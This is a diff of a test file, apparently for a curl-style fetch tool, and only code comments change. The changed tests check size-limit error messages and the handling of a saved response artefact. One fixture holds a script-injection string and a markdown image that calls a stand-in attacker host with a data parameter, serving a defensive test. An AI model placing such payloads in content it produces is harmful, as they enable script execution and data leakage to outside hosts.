@@ -99,12 +99,12 @@ describe("curl_execute size ceiling — both representations are checked", () =>
 
         expect(text).toContain("exceeds maximum allowed");
         expect(text).toContain(`${body.length} bytes`);
-        // **The teeth, and the first version of this case had none.** A decode
-        // only ever inflates, so the decoded-length gate strictly subsumes the
-        // wire-length one and removing the wire check failed nothing. What the
-        // wire check uniquely provides is a TRUE message: this body is ASCII,
-        // so it is perfectly valid UTF-8 and merely too big, and the decoded
-        // arm's wording would tell the caller otherwise.
+        // **The teeth.** A decode only ever inflates, so the decoded-length gate
+        // strictly subsumes the wire-length one and a size assertion alone cannot
+        // fail when the wire check is removed. What the wire check uniquely
+        // provides is a TRUE message: this body is ASCII, so it is perfectly valid
+        // UTF-8 and merely too big, and the decoded arm's wording would tell the
+        // caller otherwise.
         expect(text).not.toContain("not valid UTF-8");
         expect(text).not.toContain("on the wire");
     });
@@ -160,9 +160,9 @@ describe("curl_execute saved artefact — defended, and honestly measured", () =
         // diagnostics they opened it for — `stripHtmlComments` deletes the
         // `<!-- trace-id -->` a framework puts its trace in.
         //
-        // `text/markdown` because it is the declaration that used to select BOTH
-        // stage sets, so it is the strongest available test that no declared type
-        // reaches a stage from here.
+        // `text/markdown` because it is the declaration that selects BOTH stage
+        // sets in `defendText`, so it is the strongest available test that no
+        // declared type reaches a stage from here.
         const body = Buffer.from(
             "# ok\n\n<script>alert(1)</script> and ![x](https://evil.test/?d=1)",
             "utf8"
